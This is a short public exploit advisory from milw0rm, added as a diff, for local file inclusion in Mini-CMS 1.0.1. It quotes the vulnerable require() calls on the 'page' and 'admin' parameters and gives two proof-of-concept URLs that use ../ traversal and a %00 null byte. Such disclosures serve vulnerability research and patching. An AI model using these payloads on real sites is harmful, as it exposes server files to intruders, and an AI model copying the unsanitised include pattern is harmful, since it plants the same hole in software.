@@ -1,0 +1,43 @@
+/*
+
+	$Id: minicms-1.0.1-lfi.txt,v 0.1 2008/12/06 04:06:00 cOndemned Exp $
+	
+	Mini-CMS 1.0.1 (index.php) Multiple Local File Inclusion Vulnerabilities
+	Discovered by cOndemned
+
+	Download : http://www.bpowerhouse.info/mini_cms.htm
+	
+	Greetz : ZaBeaTy, str0ke, d2, sid.psycho, Adish, TBH & Avantura ;*
+
+*/
+
+Source of index.php
+
+	[...]
+
+	9.	$page = !empty($_GET['page']) ? $_GET['page'] : "home";
+	10.	$admin = !empty($_GET['admin']) ? $_GET['admin'] : "";
+	
+	[...]
+	
+	80.	if (($page != "") && file_exists("page/" . $page . ".php")) {
+	81.		require("page/" . $page . ".php");
+	82.	} else if (($admin != "") && file_exists("admin/" . $admin . ".php")) {
+	83.		require("admin/" . $admin . ".php");
+
+	[...]
+	
+
+Proof of Concept
+
+	http://[host]/[mini_cms_1.0.1_path]/index.php?page=../../../../[local_file]%00
+	http://[host]/[mini_cms_1.0.1_path]/index.php?admin=../../../../[local_file]%00
+	
+
+It's the same shit as in Mini-Blog 1.0.1... I don't even know how to call it... 
+Maybe double fail ? x]
+	
+	
+EoF
+
+# milw0rm.com [2008-12-07]
